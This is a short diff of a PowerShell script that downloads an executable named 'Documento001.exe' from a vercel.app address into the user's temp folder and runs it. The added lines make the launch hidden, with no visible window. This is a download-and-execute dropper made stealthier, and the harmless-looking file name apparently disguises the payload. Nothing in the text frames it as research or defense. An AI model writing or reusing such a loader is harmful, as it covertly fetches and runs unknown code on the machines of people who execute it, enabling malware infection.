@@ -1,2 +1,8 @@
-Invoke-WebRequest -Uri "https://testando123-blond.vercel.app/Documento001.exe" -OutFile "$env:TEMP\Documento.exe"
-Start-Process "$env:TEMP\Documento.exe"
+$exePath = "$env:TEMP\Documento.exe"
+Invoke-WebRequest -Uri "https://testando123-blond.vercel.app/Documento001.exe" -OutFile $exePath
+
+$startInfo = New-Object System.Diagnostics.ProcessStartInfo
+$startInfo.FileName = $exePath
+$startInfo.WindowStyle = 'Hidden'
+$startInfo.CreateNoWindow = $true
+[System.Diagnostics.Process]::Start($startInfo)
